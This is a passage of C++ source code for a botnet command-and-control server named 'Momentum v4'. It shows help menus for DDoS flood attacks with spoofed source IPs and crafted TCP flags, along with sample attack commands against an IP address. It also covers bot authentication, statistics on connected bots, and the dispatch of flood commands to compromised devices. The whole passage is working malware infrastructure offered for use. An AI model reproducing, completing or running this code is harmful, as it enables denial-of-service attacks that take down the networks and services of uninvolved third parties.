            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[36;1msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[36;1mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[36;1murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[36;1mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[36;1mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[36;1msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[36;1msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[36;1mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!vsebypass 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!vsebypass 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }
        if(data == "!ipsec help")
        {
            send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
  sprintf(banner1,  "\033[33;1m                                  ▄▄█▀▀▀▀▀█▄▄\r\n");
  sprintf(banner2,  "\033[33;1m                                ▄█▀\033[33;1m  ▄\033[33;1m ▄\033[33;1m    ▀█▄\r\n");
  sprintf(banner3,  "\033[33;1m                                █\033[33;1m   ▀█▀▀▀▀▄\033[33;1m   █\r\n");
  sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> █\033[33;1m    █▄▄▄▄▀\033[33;1m   █ < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
  sprintf(banner5,  "\033[33;1m                                █\033[33;1m    █\033[33;1m    █\033[33;1m   █ \r\n");
  sprintf(banner6,  "\033[33;1m                                ▀█▄\033[33;1m ▀▀█▀█▀\033[33;1m  ▄█▀\r\n");
  sprintf(banner7,  "\033[33;1m                                  ▀▀█▄▄▄▄▄█▀▀\r\n\r\n");

    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[37mAvailable options for \e[36;1mIPSEC\e[37m:\r\n", strlen("\e[37mAvailable options for \e[36;1mIPSEC\e[37m:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[36;1mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[36;1msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[36;1mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mtos: \e[37mIP header TOS.\r\n", strlen("\e[36;1mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1mid: \e[37mIP header ID (default random).\r\n", strlen("\e[36;1mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n", strlen("\e[36;1msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[37m!ipsec 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!ipsec 77.77.77.78 \e[36;1mport\e[37m=80 \e[36;1msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "bots arch")
        { 
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream;

            stats = statistics();

            if(stats.empty())
            {
                send(fd, "No devices connected for view statistics :(\r\n", 45, MSG_NOSIGNAL);
                continue;
            }

            stats_stream << "\r\n";

            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << "\e[37m" << stats_iterator->first << "\e[37m: \e[31m" << stats_iterator->second;
                stats_stream << "\r\n";
            }

            stats_stream << "\r\n";

            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if((data == "attacks enable"))
        {
            send(fd, "\e[92mAttacks has been enabled successfuly.\r\n", 44, MSG_NOSIGNAL);
            AttackingBool = 1;
            continue;
        }

        if((data == "attacks disable"))
        {
            send(fd, "\e[91mAttacks has been disabled successfuly.\r\n", 45, MSG_NOSIGNAL);
            AttackingBool = 0;
            continue;
        }

        if(AttackingBool == 0)
        {
            send(fd, "\e[91mAttacks has been disabled.\r\n", 32, MSG_NOSIGNAL);
            continue;
        }


        if(count == 0)
        {
            send(fd, "\033[97mNo clients connected to command\033[97m!\r\n", strlen("\033[97mNo clients connected to command\033[97m!\r\n"), MSG_NOSIGNAL);
            continue;
        }
        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;
        std::stringstream info_stream;

 
        if(data[0] == '|')
        {
            if(!parse_count(&process))
            {
                send(fd, "\033[97mInvalid count specified\033[97m!\r\n", strlen("\033[97mInvalid count specified\033[97m!\r\n"), MSG_NOSIGNAL);
                continue;
            }
            process.buf = process.f;
        }
        ptr = command_process(&process);
        if(!ptr)
        {
            continue;
        }
        flood(ptr, &process);

        using std::cout;
        using std::endl;
        using std::string;


        auto time_p = std::chrono::system_clock::now();
        info_stream << "\x1b[32mAttack command sent to " << (process.count == -1 ? count : process.count) << " bots (Started at " << timeToString(time_p) <<")\r\n";
        send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);

        free(ptr->buf);
        free(ptr);
    }
    pthread_cancel(counter);
    close(fd);
    pthread_exit(0);
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    //cout << "Accepting admin connection..." << endl;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;

    //cout << "Accepted admin connection!" << endl;

    tdata.fd = fd;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, admin, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    //cout << "Admin thread spawned!" << endl;

    return;
}

static void verify_client(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    char *buf;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 != 128 && b2 != 90 && b3 != 87 && b4 != 200 && b5 != 240 && b6 != 30)
    {
        return;
    }

    buf = data->buf;

    len = *(uint16_t *)buf;

    len = ntohs(len);

    if(len > sizeof(data->buf))
    {
        return;
    }
    buf += sizeof(uint16_t);
    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, buf, client_list[es->data.fd].arch_len);
    client_list[es->data.fd].authenticated = TRUE;
    printf("\033[97m[\033[31;1m!\033[97;0m] ip: \033[36;1m%d\033[97m.\033[36;1m%d\033[97m.\033[36;1m%d\033[97m.\033[36;1m%d\033[97m arch: \033[36;1m%s \033[0mConnection accepted\033[36;1m!\033[0m\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch);
    return;
}

static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 == 8890 && b2 == 5412 && b3 == 6767 && b4 == 1236 && b5 == 8092 && b6 == 3334)
    {
        // Relay the data back to the client
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }

    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;

    memset(&data, 0, sizeof(struct relay));

    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        printf("\e[36;1m[-]\e[97m Connection terminated. (%d.%d.%d.%d)\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }

    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }

    errno = 0;
    // Always read in
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    if(len <= 0)
    {
        printf("\e[36;1m[-]\e[97m Client disconnected due to bad receveid lenght. (%d.%d.%d.%d)\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data);
    }

    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }

    client_list[es->data.fd].timeout = time(NULL);

    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }

    return;
}

static void *client_timeout(void *arg)
{
    int i = 0;

    while(TRUE)
    {
        for(i = 0; i < MAX_BOTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
            {
                continue;
            }

            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                printf("\e[36;1m[-]\e[97m Connection timeout. (%d.%d.%d.%d) arch: %s\n", client_list[i].arch, client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }
        }

        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);

    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    return;
}

static void epoll_handler(void)
{
    //int efd = -1;
    struct epoll_event client_event;
    struct epoll_event admin_event;
    int ret = -1;
    struct epoll_event *es;
    int x = 0;
    pthread_t client_timeout_thread;

    //cout << "Started the epoll handler..." << endl;

    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }

    //cout << "Created the epoll fd!" << endl;

    client_event.data.fd = client_fd;
    // Edge-triggered events
    client_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    admin_event.data.fd = admin_fd;
    // Edge-triggered events
    admin_event.events = EPOLLIN | EPOLLET;

    //
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }

    //cout << "Added the fds to epoll!" << endl;

    // Allocate memory for the client list
    client_list = (struct clients *)calloc(MAX_BOTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }

    for(x = 0; x < MAX_BOTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, 64);
    }

    es = (struct epoll_event *)calloc(MAX_BOTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }

    //cout << "Allocated memory!" << endl;

    // Spawn the timeout thread
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);

    // Start the main event loop
    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;

        n = epoll_wait(efd, es, MAX_BOTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }

        for(i = 0; i < n; i++)
            process_event(&es[i], efd);
    }

    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

int main(void)
{
    std::cout << "\e[37;1m-== \e[0m\e[31mMomentum v4 \e[37;1m- \e[32mCNC Opened \e[37;1m==-" << std::endl;
    std::cout << "\e[32;1mBind port: \e[37;1m8888" << std::endl;
    std::cout << "\e[32;1mBot port: \e[37;1m98 (\e[32;1mBots report port\e[37;1m)" << std::endl;
    std::cout << "\e[32;1mAdmin port: \e[37;1m53 (\e[32;1mCNC Server | Connection: \e[0m\e[31mRAW\e[37;1m)" << std::endl;

    mysql_clear_login();

    client_bind();
    admin_bind();

    epoll_handler();

    return 0;
}
